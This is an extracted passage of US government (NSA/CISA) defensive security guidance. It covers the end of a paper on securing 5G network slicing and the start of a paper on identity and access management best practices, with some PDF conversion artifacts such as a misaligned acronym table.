legitimate slices.
A threat actor attacking a weak RBAC mechanism or exploiting a vulnerability on the system can
allow the threat actor to further deploy malicious code into the telecommunications environment
by modifying the deployment patterns. The OSS/BSS system may be used (e.g., using the Os-Ma
interface) by an attacker to gain privileges to modify slice design and orchestration/activation of
the slice and associated NFs, and modify changes to slice connections (e.g., modifications to service
chaining).
Another class of attack that must be addressed as a high priority includes tampering. An attacker
may tamper with policy registries (e.g., authorization policies), VNF or CNF packages and artifacts,
modification of affinity and anti-affinity rules, VNF instance information, VNF / CNF attestation
TLP:CLEAR
data, etc.
Spoofing of user or machine identities attacks using password/private key stealing, or Man-in-theMiddle (MITM) may allow the impersonator to conduct activities in deploying malicious code into
the telecommunications environment using the OSS/BSS, NFVO, VNFM or VIM/CISM. An attacker
could also spoof the URL of a legitimate repository from where the orchestrator is expected to pull
images.
To Counter the Above Threats, and Ensure Network Slices Are Designed and
Deployed in a Secure Manner, Recommended Security Mitigations Include:
1) A centralized identity management system that is part of the NSP
s PKI system, which is
capable of issuing and managing X.509v3 certificates to the various orchestration
components (MANO or ONAP functions). The certificates are then used for mutual
authentication between the different components before service requests can be processed.
2) Granular attribute and role-based access control (RBAC) that limits access to a 
resource
scope
 and 
duration
 and the type of 
actions
 (e.g., Create, Read, Update, and Delete
[CRUD] operations) that can be performed.
3) Ensure that the authenticity- that every artifact is from a trusted vendor- and integrity of the
packages and artifacts are maintained throughout the life cycle of the xNF. Another class of
attack that must be addressed as a high priority includes tampering. An attacker may
tamper with policy registries (e.g., authorization policies), VNF or CNF packages and
artifacts, modification of affinity and anti-affinity rules, VNF instance information, VNF /
CNF attestation data, etc.
4) Finally, ensure that the NSP certifies the VNF packages do not contain any known
vulnerabilities once the package has been on-boarded by running security scans.
Additionally secure 
supply-chain
 requirements may need to be adhered to by the NSP.
The security features listed above, and using zero-trust framework, would help mitigate attacks on
on-boarding and instantiation of the network slices.
Network slice design and deployment across networks will rely on defined standardized slice types
(in 3GPP) and the GSMA-defined Generic Slice Template (NEST). End to end inter-operator design
and deployment of slices is currently unlikely with roaming and interconnect relying mostly on
SLAs between operators. This is in part because one MNO
s network management cannot be
imposed on another MNO
s operations. Particularly challenging is in the case of local breakout for
slice orchestration as both the home and the visited networks are involved.
Orchestration of a slice will require service agreements to be in place between transport,
RAN/core, and slice providers in advance of a service request. Coordinated management is
essential between the RAN/core, interconnection, and the transport domains to ensure the E2E
SLAs, which may include cross-domain orchestration. In addition to that, transport and mobile
network capabilities are expected to be harmonized to ensure that mobile network capabilities are
not compromised by limitations in the transport network.
TLP:CLEAR
Network Slice Isolation and Segregation Recommendations:
Logical isolation and performance isolation between network slices.
Physical isolation of physical resources for network slices, and separate management
systems and administrators will be required to meet high confidentiality, integrity, and
availability triad requirements.
Data plane on one slice ought not influence other network slices.
Control plane actions (e.g., creation/update/deletion) have no influence on other slices.
ETSI recognized that leakage of data between network slices as a significant problem. To avoid
leakage or breach issues between network slices, it is recommended that any implementation
provide risk mitigation from attacks from one slice to another.
Network Slice Implementation Recommendations:
Usage-specific security policies regarding authentication and authorization requirements
(e.g., IoT vs. mobile broadband user) must be configurable.
Slice-specific authentication that is performed over and above the 3GPP primary
authentication is carried out to meet customer user authentication requirements.
Network Slice and the provider take into consideration privacy of user information and
device identifiers, including following regulations like Customer Proprietary Network
Information (CPNI).29
Confidentiality must be considered for network slice selection information when sent over
the RAN.
Isolation of network traffic ought to be maintained when a common control plane between
different network slices is used.
Security of sensitive shared network elements, such as the UDR that stores subscriber
profiles, needs to be secured and actively monitored.
29 Customer Proprietary Network Information (CPNI), June 9 2008, https://docs.fcc.gov/public/attachments/DA-
08-1321A1.pdf
TLP:CLEAR
OPERATIONS AND MAINTENANCE CRITERIA
Introduction
5G network slicing adds complexity to a network. While there are standards defining specifications
for how operators build their 5G networks, there are no clear specifications for how network
operators and slice providers develop, implement, and maintain security for network slicing.
During operations and maintenance, improper NS configurations and management may present an
opportunity for malicious actors to access data from different slices that they otherwise do not
have access to, or to deny access to authorized slice users. This is the reason authentication and
attribute-based access controls (ABAC) are fundamental to a network slice.
Definition of Operations and Maintenance
When a systems engineer fields a system, it enters the Operations Phase. Operating a 5G network
typically involves day-to-day operational and management activities, including (but not limited to)
scaling in/out based on service assurance, health monitoring, security scans, etc.
Maintenance refers to the general upkeep of the network slices. Preventive maintenance is a
schedule of planned actions aimed at preventing breakdowns and failures before they occur and at
preserving and enhancing equipment reliability by replacing worn components before they fail.
Preventive maintenance for a 5G network slicing might include software patching and periodic
updates.
Operations and maintenance (O&M) involve monitoring configuration, fault, and performance
management by humans, or by automation. To ensure security, all intra-datacenter
communications must use standards-based and approved encryption, and be mutually
authenticated security (e.g., mutual TLS or IPsec) to ensure confidentiality, integrity, and
availability.
Importance of Operations and Maintenance
For 5G network service providers, the O&M phase includes activation, supervision, reporting,
deactivation, and modification activities. Each network slice may have unique SLRs. The actions of
operators and O&M tools must assure that those requirements are met. These need robust O&M
tools, processes, and capabilities. For example, maintaining the integrity of the O&M platforms is
extremely critical and therefore their trust-enabling functions (e.g., PKI authorization server) need
to be always validated for integrity leveraging hardware roots-of-trust and remote attestation.
Backwards compatibility or at least co-existence of multi-mode network elements from previous
generations also poses architectural challenges to 5G operators. These complex structural
problems are exacerbated in roaming situations, or in use cases that involve multi-operators
working together. Additionally, network slice providers work with the vendor of VNF packages,
platform software vendors etc. to ensure that the authenticity (ensuring every artifact is from a
trusted vendor). Each NSP must assure the integrity of each package is maintained throughout the
life cycle of the VNF. To achieve this the NSP and the vendors need to agree on a trust model that
either uses third-party CA or the NSP
s PKI system. Also, the NSP needs to certify that the VNF
TLP:CLEAR
package does not contain any known vulnerabilities once the package has been on-boarded by
running security scans.
Effective O&M solutions strike a delicate balance between cost, performance, and
functionality/security. Techniques to meet this objective include centralized monitoring, fault root
cause analysis, performance data analysis, automatic O&M controls, etc.
Basic 5G network performance assurance capabilities require network/user behavioral
visualization, fault demarcation/isolation, and self-diagnosis capabilities. NSP provides service
assurance to key performance indicators and visibility to their customers. For example, customers
can clearly know the details on both security and service assurances that the slice provides.
Detailed logs on performance, faults, and security events could be provided to authorized customer
personnel or machines. Based on measurements, the service assurance platform (e.g., using
Artificial Intelligence/Machine Learning (AI/ML)) can tailor the service and security assurances to
match the SLR.
Orchestration of Network Slices
Policy Considerations
Each network slice operates on a specific tracking area associated with a collection of logical 5G
radio nodes (gNBs) and the associated set of Access and Mobility Management functions.
Emblematic transport data plane technologies include IP, VPN, and Virtual Local Area Network
(VLAN). It is paramount that the collection of 5G technologies comply with organization security
policy. Additionally, E2E QoS requirements need to be supported within the slices designated
deployment area; in practice, the E2E QoS uniquely define the combination of the QoS in the RAN
and the QoS in the 5G Core for a given network slice use case.
Workflow Considerations
Complex workflows might be required to handle a network slicing request. One example is the
provisioning of transport specific resources. Provisioning can involve intelligent and dynamic
tuning of QoS, and intelligent admission control to determine available resources. Resources
involved might belong to the RAN, the 5G Core, or both.
Maintenance of Network Slices
Maintenance of a network slice includes assuring that all SLRs are met. Service assurance includes
resource management and making sure SLRs and policies (internal or intra-operator) are met.
Once a network slice has been created and configured to meet certain SLRs, it needs to be
monitored and maintained over time as threats continue to evolve.
Monitoring
It is expected that network monitoring covers all SLRs specified by associated network slice service
profiles, including the operational state of each hardware and software component of a network
slice. Monitoring the usage of a network slice is not limited to fraud detection, revenue assurance,
or device behavior analysis for obvious network impacts, e.g., DoS signaling storm or user traffic
saturation. Monitoring can be used by the system to protect itself from an attacker that may gain
TLP:CLEAR
access directly to that system.
It is important to identify where the security monitoring interfaces are within the 5G ecosystem.
This is especially important in multi-vendor implementations where functionality from different
sources might be deployed.
Table 7 describes recommendations for typical types of mobile network monitoring activities. For
example, in NIST 5G Cybersecurity, it highlights the value of having good visibility across the 5G
infrastructure; consequently, there is a need to continuously monitor communications patterns, see
threats within the extended network, and detect and respond to threats using methods such as
behavioral modeling, supervised machine learning, and unsupervised machine learning.34
The reference materials in Table 7 contain various attributes needed to maintain consistency and
reliability of each network slice. Implementations provide timely and efficient access that
information.
Table 7:
Examples of Network Monitoring Activities for 5G Networks
Types of Network Monitoring
Performance Management
Quality of Service
NIST 5G Cybersecurity
Control Plane
Communication
User-Plane Communication
Anomaly Detection
Explanation
Due to the complex nature of mobile networks and vendors
diversity of hosting platforms, a unique overarching
performance management technique across different networks
and vendors is required
5G QoS include network performance metrics (e.g., latency,
throughput, etc.) but might also include availability, reliability,
accessibility, retainability, etc.
NIST SP1800-33B provides examples of 5G standard features
and third-party security controls for successful 5G
implementations.
Control plane communication is not only protected for privacy
but also protected against attacker
s malicious modifications,
performance issues, and anomalous behaviors.
This is the communication which connects the actual data
coming over the RAN to the Internet which is helpful to detect
acceptable use violations e.g., a DDoS attack, DNS tunneling,
spoofing, etc.
Anomaly detection is a capability of identifying unusual
activities or behaviors in networks. A variety of sensors,
filtering and advanced (e.g., AI/ML-based) security analytics are
necessary to detect sophisticated and zero-day threats.
To conduct O&M activities successfully, the service requirements as defined by a network slice
profile need to be monitored. As noted in the Figure 10 above, monitoring a network slice can
either be functional monitoring and/or security monitoring.
Typically, functional monitoring is already provided by the equipment CORE, RAN, and that
element manager assuming the network is operating in a healthy state. It is paramount that
security monitoring is built with zero-trust tenets in mind. Hence, monitoring solutions from the
previous generations need to be integrated or updated to include 5G specific features. Otherwise,
TLP:CLEAR
carriers will have to build a standalone separate monitoring capability to support 5G O&M.
In the federated roaming scenarios, where slices are traversed into another carrier network, SLA
needs to be established before deployment; a common methodology of monitoring and security
mitigation schemes needs to be present at the gateways or logical borders between carriers.
Monitoring incorporates the collected data from various sources in the 5G networks. The acquired
data will be analyzed first to see what insights and conclusions may be drawn. The analysis is
followed by alerting, visualizing, and reporting. These steps are discussed in the following clauses.
Alerting
Alert capability is an important management tool. It is recommended that any alerting program
support the ability to subscribe to user specified asynchronous alert messages. Alerts can notify a
cyber protection team (CPT) or network operators of unusual activities and possible cyber events.
Alerts can be used in conjunction with Security Incident Event Management (SIEM) for correlating
cyber events. For example, periodic UE and network scanning can identify anomalous behavior that
shows malicious code has compromised certain 5G network element. For example, this may trigger
an alert to the security orchestration, automation, and response (SOAR) platform, which instructs
the network monitoring system (NMS) to disconnect the UE and prevent it from registering to the
network until the malicious code has been removed from the UE.
In this simple example, SIEM supports threat detection, compliance, and security incident
management through the collection and analysis (both near real time and historical) of security
events, as well as a wide variety of other event and contextual data sources30. A SIEM cannot
address alerts by themselves, and will not mitigate any threats directly; however, having them
allows CPT and operators to respond quickly and efficiently. Together, they provide CPT and cyber
operations near-real-time benefits, deep insights over time-based data analysis, and underlying
support for cybersecurity visualizations and dashboards.
Reporting
Reporting functionality includes providing status of updates, metrics that can be used to assure
that an installation is correct, and metrics that can be used to detect potential issues. The reporting
can include a summary of network slice health status and overview.
Reporting and storage of past historical data are both important in O&M; they provide
troubleshooters the ability to review and later analyze a problem. For example, cyber forensics and
anomaly detection, at both the network level and user behavioral level, rely on past reports and
historical data. Summary reports can be periodically generated for management, but these would
be different than reports required by maintenance personnel, as reports for maintenance
personnel need to be comprehensive to encompass all relevant technical details and be in a
readable format.
30 https://www.gartner.com/en/information-technology/glossary/security-information-and-event-management-siem
TLP:CLEAR
Conclusion
5G SA network slicing is poised to become a key technology feature within 5G, so it is imperative
we understand potential security threats to 5G network slicing. Hence, it is important to recognize
industry-recognized best-practices of how 5G network slicing can be implemented, designed,
deployed, operated, maintained, potentially hardened, and mitigated as they affect QoS and
confidentiality, integrity, and availability triad SLAs. The goal is to promote collaboration amongst
MNOs, hardware manufacturers, software developers, other non-MNOs, systems integrators, and
network slice customers, in order to facilitate increased resiliency and security hardening within
5G network slicing.
TLP:CLEAR
APPENDIX: Abbreviated Terms
Acronym
3GPP
5G-AKA
5G SA
ABAC
AI/ML
APRF
CISA
CISM
CRUD
CSMF
CUPS
DDoS
DHCP
eMBB
EAP-AKA
GSMA
HPLMN
IETF
Meaning
Third Generation Partnership Project
Fifth Generation Cellular Network
5G Authentication and Key Agreement
5G Core Network
5G System
5G Standalone Cellular Network
5G QoS Identifier
Authentication, Authorization, and Accounting [Server]
Attribute-based Access Controls
Application Function
Artificial Intelligence/Machine Learning
Access Management Function
Application Programming Interface
Access Point Name
Authentication Credential Repository Processing Function
Confidentiality, Integrity, and Availability
Container Image Registry
Cybersecurity and Infrastructure Security Agency
Container Infrastructure Service Management
Control Plane
Create, Read, Update and Delete
Cyber Protection Team
Communication Service Management Function
Central Unit
Control and User Plane Function Separation
Distributed Denial of Service
Dynamic Host Configuration Protocol
Data Network
Data Network Name
Domain Name Service
Denial of Service
Distributed Unit
End-to-End
Extensible Authentication Protocol
Enhanced Mobile Broadband
Evolved Packet Core
Enduring Security Framework
Extensible Authentication Protocol Authentication and Key Agreement Prime
GSM Association
Home Public Land Mobile Network
Infrastructure as Code
Identity & Access Management
Internet Engineering Task Force
Internet of Things
TLP:CLEAR
Acronym
IPsec
MANO
MIMO
MITM
NEST
RBAC
NFVO
NIST
non-RT RIC
NSACF
NSSAAF
NSSAI
NSSF
NSSMF
OAuth
ONAP
OSS-BSS
PDCP
PLMN
PLMP
RADIUS
RBAC
SDN-C
SEPP
SIEM
SOAR
Meaning
Internet Protocol Security
IP Packet eXchange
Management and Network Orchestration
Mobile Device Management
(Formally known as the) Metro Ethernet Forum
Multiple-input/Multiple-output
Man in The Middle
Network Slice Template
Non-access Stratum
Role-based Access Control
Network Function
Network Function Virtualization
Network Functions Virtualization Orchestrator
National Institute of Standards and Technology (US DOC)
Non-Real-Time RAN Intelligence Controller
Network Resource Function
Network Slice Admission Control Function
Network Slice Provider
Network Slice-Specific Authentication and Authorization Function
Network Slice Selection Assistance Information
Network Slice Selection Function
Network Slice Subnet Management Function
Operations and Maintenance
Open Authorization
Open Network Automation Platform
Operations Support System- Business Support System
Policy Control Function
Packet Data Convergence Protocol
Protocol Data Unit
Public Land Mobile Networks
Public Mobile Network
Physical Network Function
Quality of Service
Remote Authentication Dial-In User Service
Radio Access Network
Role-based Access Control
Route Selection Descriptor
Radio Unit
Service-Based Interface
Software Defined Network Controller
Standards Development Organization
Security Edge Protection Proxy
Security Incident Event Management
Service Level Requirement
Session Management Function
Service Management and Orchestration [Framework]
Security Orchestration Automation and Response
TLP:CLEAR
Acronym
UICC
URSP
VLAN
VNFD
VNFM
Meaning
Traffic Descriptor
Transport Layer Security
Transport Network
Unified Data Management
Unified Data Repository
User Equipment
Universal Integrated Circuit Card
User Plane
User Plane Function
User Equipment Route Selection Policy
Virtual Infrastructure Manager
Virtual Local Area Network
Virtual Network Function
VNF Descriptor
Virtual Network Function Manager
Virtual Private Network
Zero Trust Architecture
TLP:CLEAR
TLP:CLEAR
Identity and Access Management: Recommended Best Practices for Administrators
DISCLAIMER
DISCLAIMER OF ENDORSEMENT
This document was written for general informational purposes only. It is intended to apply
to a variety of factual circumstances and industry stakeholders, and the information
provided herein is advisory in nature. The guidance in this document is provided 
as is
Once published, the information within may not constitute the most up-to-date guidance or
technical information. Accordingly, the document does not, and is not intended to,
constitute compliance or legal advice. Readers should confer with their respective advisors
and subject matter experts to obtain advice based on their individual circumstances. In no
event shall the United States Government be liable for any damages arising in any way out
of the use of or reliance on this guidance.
Reference herein to any specific commercial product, process, or service by trade name,
trademark, manufacturer, or otherwise, does not constitute or imply its endorsement,
recommendation, or favoring by the United States Government, and this guidance shall not
be used for advertising or product endorsement purposes. All trademarks are the property
of their respective owners.
PURPOSE
The National Security Agency (NSA) and the Cybersecurity Infrastructure Security Agency
(CISA) developed this document in furtherance of their respective cybersecurity missions,
including their responsibilities to develop and issue cybersecurity recommendations and
mitigations. This information may be shared broadly to reach all appropriate stakeholders.
CONTACT
Client Requirements/Inquiries: Enduring Security Framework nsaesf@cyber.nsa.gov.
Media Inquiries / Press Desk:
 NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov
 CISA Meda Relations, 703-235-2010, CISAMedia@cisa.dhs.gov
Identity and Access Management: Recommended Best Practices for Administrators
Table of Contents
Introduction ................................................................................................................................................. 1
Scope ............................................................................................................................................................ 2
The Threat Landscape................................................................................................................................. 2
IAM Threat Mitigation Techniques ............................................................................................................ 4
Identity Governance .................................................................................................................................... 4
What it Does............................................................................................................................................. 4
Why It Matters ......................................................................................................................................... 5
Environmental Hardening .......................................................................................................................... 6
What it Does............................................................................................................................................. 6
Why it Matters ......................................................................................................................................... 7
Setting the Stage for Implementation .................................................................................................... 7
Implementing Best Practice ................................................................................................................... 7
Actions to Take Now ............................................................................................................................... 9
Summary ................................................................................................................................................ 10
Identity Federation and Single Sign-On................................................................................................... 10
What it Does........................................................................................................................................... 10
Why it Matters ....................................................................................................................................... 10
Factors to consider when selecting an SSO solution ...................................................................... 11
Implementing Best Practices ................................................................................................................ 13
Actions to Take Now ............................................................................................................................. 13
Summary ................................................................................................................................................ 13
Multi-Factor Authentication ..................................................................................................................... 13
What It Does .......................................................................................................................................... 15
Why MFA Matters .................................................................................................................................. 17
Preparation for Implementing MFA..................................................................................................... 18
Catalog User Populations, Device Types, and Use Cases ................................................................ 18
Evaluate Assurance Requirements .................................................................................................. 19
Evaluate Privacy and Operational Considerations ......................................................................... 19
Implementing MFA................................................................................................................................ 20
Actions to Take Now ............................................................................................................................. 21
Summary ................................................................................................................................................ 21
Identity and Access Management: Recommended Best Practices for Administrators
IAM Auditing and Monitoring................................................................................................................... 22
What it Does........................................................................................................................................... 22
Why it Matters ....................................................................................................................................... 22
Preparation for Implementing Best Practice ...................................................................................... 23
Actions to Take Now ............................................................................................................................. 24
Summary ................................................................................................................................................ 25
Conclusion.................................................................................................................................................. 25
Appendix I: Actions to Take Now Checklist............................................................................................. 26
Identity and Access Management: Recommended Best Practices for Administrators
Introduction
Identity and access management (IAM) is a framework of business processes, policies, and
technologies that facilitate the management of digital identities to ensure that users only
gain access to data when they have the appropriate credentials. Beyond the physical users,
service and system accounts are also in scope for IAM and critical for IAM administrators to
manage within their organizations. Inventorying, auditing, and tracking all of these
identities and their access is imperative to ensure that proper IAM, including permissions
and active status, is executed on a regular basis. Managing the growing complexities of
digital identities can be daunting especially with industry
s push toward cloud and hybrid
computing environments; however, the need for IAM is more important today than ever. In
recent years, we have seen various nation state-led cyber operations successfully access
protected data by targeting the trust established within networks or by exploiting
vulnerabilities in IAM products and/or IAM implementations. Specifically, the critical
infrastructure within the U.S. is an attractive target for the adversaries. In fact, according to
the 2022 Verizon Data Breach Investigation Report, 80% of web applications attacks
leveraged stolen credentials, a technique used by both basic cyber criminals and nationstate bad actors. Additionally, excluding breaches based on user error and insider misuse,
40% of breaches involved stolen credentials and nearly 20% involved phishing. Recent and
notable attacks include:
In 2021, compromised credentials were used to attack and shut down the Colonial
national gas pipeline in the U.S. 1
In another 2021 cyberattack, an unknown attacker manipulated computer systems
in a Florida water treatment plant to increase the concentration of sodium
hydroxide in the water supply by a factor of 100. 2
In 2022, another attack targeted a water treatment plant in South Staffordshire,
U.K. 3
As such, the critical infrastructure organizations have a particular responsibility to
implement, maintain, and monitor secure IAM solutions and processes to protect not only
their own business functions and information but also the organizations and individuals
with whom they interact. It is important to keep in mind that IAM systems implement
credential management, authentication, and authorization functions that are foundational
to security and also very complex and subject to vulnerabilities if not implemented
correctly. Like any kind of software, IAM solutions are subject to software vulnerabilities
and must be patched, updated, and managed. A vulnerable IAM solutions can facilitate
access to multiple systems and data across the organization. Therefore, securing IAM
infrastructure is critical. Ultimately, the goal is that organizations proactively take the
1 https://www.bloomberg.com/news/articles/2021-06-04/hackers-breached-colonial-pipeline-usingcompromised-password.
2 https://arstechnica.com/information-technology/2021/02/breached-water-plant-employees-used-thesame-teamviewer-password-and-no-firewall/.
3 https://www.zdnet.com/article/confused-cyber-criminals-have-hacked-a-water-company-in-a-bizarrecase-of-mistaken-identity/.
Identity and Access Management: Recommended Best Practices for Administrators
appropriate action to protect against an attack rather than be in the position of deploying
fundamental IAM capabilities far too late.
To address the risk to a wide range of critical public and private sector networks, the
Enduring Security Framework (ESF) hosted a working panel staffed by government and
industry subject matter experts tasked with assessing the challenges and threats to IAM
and identifying recommendations on how to mitigate these risks. While the working group
recognizes the need for a broad, layered approach to network defense, this guidance is
focused on the aspects of IAM identified as critical in addressing the threats laid out in this
paper.
Scope
This paper sets forth the IAM best practices for administrators to implement to address
threats that are highly likely, highly impactful, or both. Furthermore, it identifies mitigation
areas most effective in reducing the impacts of these threats to IAM.
This paper focuses on identifying mitigations for the following techniques frequently used
by bad actors:
Creating new accounts to maintain persistence.
Assuming control of accounts of former employees which were not suspended upon
employee termination.
Exploiting vulnerabilities to forge authentication assertions (e.g. Kerberos tickets,
Security Assertion Markup Language (SAML) assertions, OAuth2).
Utilizing or creating alternative access points to systems.
Exploiting or utilizing users with legitimate access.
Compromising passwords through a variety of tactics (e.g. phishing, multi-factor
authentication (MFA) bypass, credential stuffing, password spraying, social
engineering, brute force).
Gaining system access and exploiting stored credentials.
Exploiting default passwords in built-in or system accounts, exploiting active attacks
to downgrade, and exploiting deprecated encryption, or plain-text protocols to
access credentials.
The Threat Landscape
Organizations are subject to attacks from a broad range of threat sources including nationstates, terrorist groups, organized crime, hacktivists, and individuals looking to harm or
embarrass an organization. Additionally, organizations are subject to attacks where a
trusted user is the source of the compromise (e.g., insider threat). The spectrum of threat
sources varies wildly in capabilities, motivations, and methods. For example, nation-state
actors have significant resources, and can establish long-term plans to gain access to
critical resources. They can also use indirect methods such as exploiting the supply chain.
Identity and Access Management: Recommended Best Practices for Administrators
Exploiting known IAM vulnerabilities could allow a bad actor the same access to resources
as legitimate users by mimicking legitimate activity which complicates detection of the bad
actor. This provides the bad actor more time to gain access to resources and elevate
privileges to gain persistent access.
For example, a recent CISA Alert (AA21-321A) 4 showed that Iranian governmentsponsored advanced persistent threat (APT) actors are actively targeting a broad range of
victims across multiple U.S. critical infrastructure sectors by exploiting IAM vulnerabilities
to compromise credentials, escalate privileges, and establish new user accounts on domain
controllers, servers, workstations, and in directories responsible for authenticating and
authorizing users and devices. These actors could leverage this access for follow-on
operations, such as data exfiltration or encryption, ransomware, and extortion.
Additionally, exploitation of Single Sign-On (SSO) technology (a component of IAM) is
becoming a more prevalent attack vector. Bad actors attempt to exploit the SSO functions
with hopes of easily gaining access to protected resources throughout the system and/or
organization. Several examples that show the impact of SSO compromise include:
In September 2021, Palo Alto Networks revealed bad actors exploiting a
vulnerability in Zoho
s ManageEngine ADSelfService Plus SSO solution. The bad
actors were observed deploying backdoor and credential stealing tools to maintain
access to the victim
s networks including critical infrastructure entities. 5
The SolarWinds compromise highlighted the risk of SSO exploitation. The NSA and
others characterized the 
Golden SAML,
 Active Directory Federation Services
bypass technique, as shown in Figure 1, which gave bad actors access to all of the
enterprise
s Active Directory authentication. 6
Figure 1 Depiction of 
Golden SAML
 Attack Process. 7
4 https://www.cisa.gov/uscert/ncas/alerts/aa21-321a.
5 https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/.
6 https://www.darkreading.com/attacks-breaches/solarwinds-campaign-focuses-attention-on-golden-saml-
attack-vector.
7 https://blog.sygnia.co/detection-and-hunting-of-golden-saml-attack.
Identity and Access Management: Recommended Best Practices for Administrators
Defending against this broad spectrum of attacks requires a comprehensive IAM solution,
with operational awareness of the environment to detect anomalies and attribute
anomalous activity to adversary exploits.
IAM Threat Mitigation Techniques
The best practices and mitigations discussed in this paper provide tactics that help to
counter threats to IAM through deterrence, prevention, detection, damage limitation, and
response. Specifically, this paper identifies best practices relating to:
Identity Governance - policy-based centralized orchestration of user identity
management and access control and helps support enterprise IT security and
regulatory compliance;
Environmental Hardening - makes it harder for a bad actor to be successful in an
attack;
Identity Federation and Single Sign-On 
 Identity federation across organizations
addresses interoperability and partnership needs centrally. SSO allows centralized
management of authentication and access thereby enabling better threat detection
and response options;
Multi-Factor Authentication - uses more than one factor in the authentication
process which makes it harder for a bad actor to gain access;
IAM Monitoring and Auditing - defines acceptable and expected behavior and then
generates, collects, and analyzes logs to provide the best means to detect suspicious
activity.
Identity Governance
Identity governance is the process by which an organization centralizes orchestration of its
user and service accounts management in accordance with their policies. Identity
governance provides organizations with better visibility to identities and access privileges,
along with better controls to detect and prevent inappropriate access. It is comprised of a
set of processes and policies that cover the segregation of duties, role management, logging,
access review, analytics, and reporting.
What it Does
Identity governance solutions can manage the entire identity and access lifecycle for an
organization
s workforce. The most critical lifecycle events are often referred to as 
Join,
Move, and Leave
 (JML) events:
Join 
 when a new employee or contractor joins the organization, the identity
governance solution can collect biographical, position-related, and credential data
(such as professional certifications or clearances) from recruiting, human capital
management, and personnel security systems to build out an identity record for the
individual. Identity governance systems can use this data to automatically create
Identity and Access Management: Recommended Best Practices for Administrators
accounts in directories and applications with entitlements based on the collected
data.
Move 
 when an individual
s role in the organization changes, an identity
governance system can automate the granting of additional entitlements needed for
their new role as well as the removal of entitlements that are no longer needed.
Without adequate management of Move events, long-term users tend to accumulate
privileges as their roles change, increasing the potential impact of insider abuse or
account takeover.
Leave 
 when users separate from an organization through retirement, termination,
or contract expiration, their accounts and privileges must be promptly terminated.
Identity governance systems can automate the disablement and removal of accounts
in response to separation actions in human capital management systems or other
personnel systems. Identity governance systems also provide a record of accounts
and privileges associated with the individual, ensuring that access is completely
removed.
Why It Matters
Identity governance solutions implement governance policies using orchestration tools
that are designed to link people, applications, data and devices, and allow customers to
determine who has access to what, what kind of risk that represents, and take action in
situations where policy violations are identified. They provide a comprehensive view of an
organization
s identity management practices and identify gaps in the identity
management lifecycle. This centralized control and visibility helps to mitigate the risk that
identities and privileges will be mismanaged, as well as the risk that attackers can exploit
different systems within the organization without being detected.
Additionally, identity governance systems maintain an inventory of active accounts and
privileges that currently exist in systems and applications, enabling monitoring and
analysis. Account creation and modification events can be reviewed and correlated with
approved access requests. Policy rules can be created for segregation of duties
requirements, enabling administrators to identify and remove non-compliant combinations
of privileges assigned to individuals. Automated risk analysis can identify high-risk
individuals so that appropriate mitigations can be taken, such as re-assigning privileges or
elevated monitoring of those users
 accounts. The access inventory also enables application
and data owners to periodically review and reconcile accounts and privileges. Together,
these processes support the principle of Least Privilege, ensuring that users have only the
privileges required for their job functions.
Further, managing system and application accounts is also critical. Identity governance
systems can monitor and manage the creation, modification, and removal of these accounts
to ensure they are only created and granted privileges in response to approved,
documented change requests. The entitlements policies, monitoring, risk analysis, and
access reconciliation processes applied to user accounts as described above can also ensure
that system accounts are managed in accordance with least privilege.
Identity and Access Management: Recommended Best Practices for Administrators
Effective identity governance can mitigate the impacts of many prevalent IAM threats:
Phishing, spear phishing, or social engineering: Identity governance cannot
directly prevent these attacks, but can reduce the potential impact of user account
compromise using these techniques. A compromised account with excessive
privileges can do more damage than one whose privileges are contained. In
addition, Segregation of Duty controls enforced through identity governance can
ensure that compromising a single account does not provide access to key business
processes and data.
Insider threats: As with phishing and other account compromise threats, identity
governance cannot prevent insiders from abusing their privileges, but it can reduce
the impact when these events happen if they do not have excessive privileges.
Creating accounts to maintain persistence: Attackers who compromise
privileged accounts may attempt to create additional user accounts to maintain
access to a system even if the initially compromised accounts are revoked or
disabled. Identity governance systems monitor account creations and can help an
organization identify unauthorized account creation.
Privileged accounts require additional monitoring and control and should be separately
managed using a Privileged Access Management (PAM) solution with strong identity
governance. Modern PAM solutions include advanced capabilities such as just-in-time
provisioning, in which users are temporarily granted privileged access in order to complete
a specific task or resolve an issue. This further supports the principle of least privilege and
reduces the number of privileged accounts that an attacker could target.
Environmental Hardening
Hardening the enterprise environment includes making sure the foundations and
implementations of IAM are sufficiently secured, assured, and trusted. The degree of
hardening will vary depending on what is being protected. For example, credential issuing
systems for cryptographic digital certificates or stores of passwords are more critical since
they secure authentication for entire organizations. Implementation of cryptographic
mechanisms must also be sufficient to provide the level of security assumed and needed by
the system.
What it Does
Environmental hardening secures the hardware components and software in the
enterprise environment around the IAM solution. A defense is only as good as its weakest
component. Therefore, it is important when implementing an IAM solution to include
securing the other services that are involved. Combining environmental hardening (e.g.,
patching, asset management, and network segmentation) best practices with sound IAM
foundations and implementations reduces the likelihood of a compromise and limits
potential damage.
Identity and Access Management: Recommended Best Practices for Administrators
Why it Matters
Environmental hardening generally makes it harder for a bad actor to exploit IAM
components and software. Bad actors target IAM solutions because they can provide access
to a significant amount of sensitive data, enables persistence, and be used for future
malicious cyber operations. IAM solution components must be hardened to prevent
footholds for attackers to pivot to more critical systems.
Setting the Stage for Implementation
Implementing Best Practice
Physical and
Environmental
Hardening
Ensure assets are protected from interruption or data loss due
to unauthorized access to a specific physical environment. This
can be done by limiting physical access to the data center
hosting the IAM assets and the systems controlling logical
access to the IAM assets. It is also imperative to use best
practices to provide the appropriate resilience of these systems
from other physical threats. IAM functions and capabilities
should be purposely implemented with system georedundancy, if possible, to survive and withstand a physical
and/or destructive cyber event at one physical location.
For IAM systems hosted on-site in the organization
s work
offices, ensure the server room is located behind a locked door
Identity and Access Management: Recommended Best Practices for Administrators
Network
Hardening
Backups
Least
Privileged
with access granted only to those who have a purpose in that
room. A cipher lock or badge access can add MFA capabilities to
access the room itself.
Ensure that any doors and rooms that provide access to
sensitive or critical IAM infrastructure are monitored with
cameras that can trigger an alarm if there is unauthorized
physical access to the facility (e.g., data center) and room (e.g.,
on-premises server room).
For IAM systems managed offsite or through a cloud provider,
environment hardening needs to ensure remote access is
limited by using strong phishing-resistant MFA and limiting
access based on other factors (e.g. role-based, normal work
hours, location, device, position). It is also key to only engage
reputable cloud service providers when choosing to implement
the IAM systems offsite.
Ensure disposal of used assets properly by thoroughly wiping
or completely destroying the asset depending on the sensitivity
of the data.
When software patches are published for IAM components
and/or software, perform a security risk assessment on the
patch to assist with installation prioritization. If you have the
capacity, consider executing a comprehensive security test plan
on all software patches in a non-production environment to
